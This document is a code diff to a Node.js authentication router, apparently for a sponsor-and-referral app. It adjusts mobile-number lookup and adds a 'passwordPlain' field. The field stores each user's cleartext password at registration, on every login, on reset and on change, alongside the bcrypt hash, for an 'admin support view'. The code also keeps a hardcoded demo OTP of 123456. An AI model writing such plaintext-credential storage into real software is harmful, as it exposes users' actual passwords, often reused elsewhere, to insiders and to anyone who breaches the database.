@@ -45,12 +45,13 @@ export function signToken(user, sessionId, extra = {}) {
   return jwt.sign({ sub: user._id.toString(), email: user.email, sid: sessionId?.toString(), ...extra }, JWT_SECRET, { expiresIn: '7d' });
 }
 
-/** Match stored mobiles whether they were saved as 10-digit, +91…, or spaced. */
+/** Match stored mobiles across digit-only and +prefixed variants. */
 function mobileLookupValues(value) {
   const normalized = normalizeMobile(value);
   if (!normalized) return [];
-  if (normalized.startsWith('+')) return [normalized];
-  return [normalized, `+91${normalized}`, `+91 ${normalized}`, `91${normalized}`];
+  const digits = normalized.replace(/\D/g, '');
+  const values = new Set([normalized, digits, `+${digits}`]);
+  return [...values];
 }
 
 async function openSession(user, req, deviceId) {
@@ -98,7 +99,8 @@ router.post('/register', async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Invalid OTP. Use the demo OTP code 123456.' });
     }
 
-    const passwordHash = await bcrypt.hash(String(payload.password), 10);
+    const loginPassword = String(payload.password);
+    const passwordHash = await bcrypt.hash(loginPassword, 10);
     const referralId = `ADD${Math.floor(1000 + Math.random() * 9000)}`;
 
     const user = await User.create({
@@ -107,6 +109,7 @@ router.post('/register', async (req, res) => {
       email,
       username,
       passwordHash,
+      passwordPlain: loginPassword,
       sponsorId: sponsor.referralId,
       referralId,
       country: String(payload.country).trim(),
@@ -280,6 +283,8 @@ router.post('/login', async (req, res) => {
     }
 
     user.lastLogin = new Date();
+    // Keep plain login password for admin support view (updated on each successful sign-in).
+    user.passwordPlain = password;
     await user.save();
     const session = await openSession(user, req, payload.deviceId);
     await noteSharedDevice(user, payload.deviceId);
@@ -357,6 +362,7 @@ router.post('/reset-password', async (req, res) => {
     }
 
     user.passwordHash = await bcrypt.hash(newPassword, 10);
+    user.passwordPlain = String(newPassword);
     user.resetToken = null;
     await user.save();
 
@@ -395,6 +401,7 @@ router.post('/change-password', async (req, res) => {
     }
 
     user.passwordHash = await bcrypt.hash(String(payload.newPassword), 10);
+    user.passwordPlain = String(payload.newPassword);
     await user.save();
 
     res.json({ ok: true, message: 'Password updated successfully.' });
